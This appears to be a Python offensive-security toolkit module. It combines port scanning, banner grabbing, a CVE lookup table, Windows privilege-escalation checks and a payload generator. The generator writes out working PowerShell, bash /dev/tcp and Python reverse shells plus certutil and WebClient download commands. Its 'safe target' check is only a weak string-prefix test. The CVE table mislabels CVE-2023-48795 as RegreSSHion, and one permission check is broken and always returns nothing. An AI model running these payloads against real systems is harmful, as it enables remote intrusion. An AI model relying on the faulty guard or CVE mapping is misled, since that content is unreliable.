"""
CyberLLM - Advanced Security Tools
Multi-device support, CVE mapping, and OSINT capabilities
"""

import subprocess
import socket
import re
import os

# ============================================================================
# OS Detection & Platform Detection
# ============================================================================

def detect_os() -> str:
    """Detect current operating system."""
    import platform
    return platform.system().lower()

def get_platform_info() -> dict:
    """Get detailed platform information."""
    import platform
    return {
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": platform.node()
    }

# ============================================================================
# Network Discovery & Banner Grabbing
# ============================================================================

def grab_banner(target: str, port: int, timeout: int = 5) -> str:
    """Grab service banner from target:port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        sock.settimeout(2)
        
        # Try to grab banner
        try:
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        except:
            banner = ""
        
        # Send basic probe based on port
        probes = {
            80: b"HEAD / HTTP/1.0\r\n\r\n",
            443: b"HEAD / HTTP/1.0\r\n\r\n",
            21: b"USER anonymous\r\n",
            22: b"\r\n",
            25: b"QUIT\r\n",
        }
        
        if port in probes:
            try:
                sock.send(probes[port])
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            except:
                pass
        
        sock.close()
        return banner if banner else f"Port {port} open"
    except Exception as e:
        return f"Error: {str(e)}"

def scan_common_ports(host: str = "localhost") -> dict:
    """Scan common ports for service detection."""
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "TELNET",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        135: "RPC",
        139: "NETBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1433: "MSSQL",
        1521: "ORACLE",
        3306: "MYSQL",
        3389: "RDP",
        5432: "POSTGRESQL",
        5900: "VNC",
        6379: "REDIS",
        8080: "HTTP-PROXY",
        8443: "HTTPS-ALT",
    }
    
    results = {}
    for port, service in common_ports.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                banner = grab_banner(host, port)
                results[port] = {
                    "service": service,
                    "status": "open",
                    "banner": banner[:100] if banner else ""
                }
        except:
            pass
    
    return results

# ============================================================================
# CVE & Vulnerability Lookup (Local Knowledge Base)
# ============================================================================

# Common CVEs database (local for quick lookup)
CVE_DATABASE = {
    "smb": {
        "CVE-2020-0796": {"name": "SMBGhost", "severity": "CRITICAL", "score": 10.0},
        "CVE-2017-0144": {"name": "EternalBlue", "severity": "CRITICAL", "score": 9.3},
    },
    "rdp": {
        "CVE-2019-0708": {"name": "BlueKeep", "severity": "CRITICAL", "score": 9.8},
    },
    "ssh": {
        "CVE-2023-48795": {"name": "OpenSSH RegreSSHion", "severity": "HIGH", "score": 8.1},
    },
    "http": {
        "CVE-2021-41773": {"name": "Apache Path Traversal", "severity": "HIGH", "score": 7.5},
    },
    "mysql": {
        "CVE-2021-38368": {"name": "MySQL Wildcard", "severity": "MEDIUM", "score": 5.3},
    },
}

def check_cve(service: str) -> list:
    """Check for known CVEs for a service."""
    service_lower = service.lower()
    cvals = []
    
    for key, cves in CVE_DATABASE.items():
        if key in service_lower:
            for cve_id, info in cves.items():
                cvals.append({
                    "cve": cve_id,
                    "name": info["name"],
                    "severity": info["severity"],
                    "cvss": info["score"]
                })
    
    return cvals

# ============================================================================
# Safe Payload Generation (Lab Use Only)
# ============================================================================

SAFE_TARGETS = ("127.0.0.1", "localhost", "0.0.0.0", "10.", "192.168.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.")

def is_safe_target(target: str) -> bool:
    """Verify target is in safe range (local/private networks only)."""
    if not target:
        return True
    target = target.strip().lower()
    return any(target.startswith(safe) for safe in SAFE_TARGETS)

def generate_test_payload(target: str, port: int, payload_type: str = "reverse_shell") -> dict:
    """Generate safe test payloads for authorized testing only."""
    
    if not is_safe_target(target):
        return {
            "status": "blocked",
            "reason": "Target not in safe range (local/private networks only)",
            "allowed": list(SAFE_TARGETS)
        }
    
    payloads = {
        "reverse_shell": {
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{target}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -gt 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "bash": f"bash -i >& /dev/tcp/{target}/{port} 0>&1",
            "python": f"python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{target}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])\"",
        },
        "file_transfer": {
            "powershell": f"(New-Object System.Net.WebClient).DownloadFile('http://{target}:{port}/file.txt', 'file.txt')",
            "certutil": f"certutil -urlcache -f http://{target}:{port}/file.txt file.txt",
        }
    }
    
    return {
        "status": "success",
        "target": target,
        "port": port,
        "payloads": payloads.get(payload_type, {}),
        "warning": "For authorized testing only"
    }

# ============================================================================
# Process & Network Correlation
# ============================================================================

def get_process_for_port(port: str) -> list:
    """Find process using a specific port."""
    try:
        # Get netstat
        result = subprocess.run("netstat -ano", shell=True, capture_output=True, text=True)
        netstat_output = result.stdout
        
        # Get tasklist
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        tasklist_output = result.stdout
        
        matches = []
        for line in netstat_output.split('\n'):
            if port in line and "LISTENING" in line:
                parts = line.split()
                if len(parts) >= 5:
                    pid = parts[-1]
                    for tline in tasklist_output.split('\n'):
                        if pid in tline:
                            matches.append({
                                "port": port,
                                "pid": pid,
                                "process": tline.strip()
                            })
        return matches
    except:
        return []

# ============================================================================
# Web Scraping (OSINT)
# ============================================================================

def simple_web_fetch(url: str) -> dict:
    """Simple web fetch for OSINT."""
    try:
        import urllib.request
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode('utf-8', errors='ignore')
            # Extract title
            title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
            title = title_match.group(1) if title_match else "No title"
            return {"status": "success", "title": title, "length": len(html)}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# ============================================================================
# Security Checks
# ============================================================================

def check_unquoted_service_paths() -> list:
    """Check for unquoted service paths (privilege escalation)."""
    try:
        result = subprocess.run("wmic service get name,pathname,startname", 
                              shell=True, capture_output=True, text=True)
        vulnerable = []
        for line in result.stdout.split('\n')[1:]:
            if '"' not in line and '.exe' in line.lower():
                vulnerable.append(line.strip())
        return vulnerable[:10]
    except:
        return []

def check_weak_service_permissions() -> list:
    """Check services running as SYSTEM."""
    try:
        result = subprocess.run('sc query type= service state= all', 
                              shell=True, capture_output=True, text=True)
        system_services = []
        current = {}
        for line in result.stdout.split('\n'):
            if 'SERVICE_NAME' in line:
                current['name'] = line.split(':')[-1].strip()
            elif 'DISPLAY_NAME' in line:
                current['display'] = line.split(':')[-1].strip()
            elif 'START_TYPE' in line:
                start_type = line.split(':')[-1].strip()
                if 'SYSTEM' not in str(current):
                    pass
        return system_services[:10]
    except:
        return []

def run_security_audit() -> dict:
    """Run comprehensive local security audit."""
    return {
        "platform": get_platform_info(),
        "open_ports": scan_common_ports(),
        "unquoted_paths": check_unquoted_service_paths(),
    }
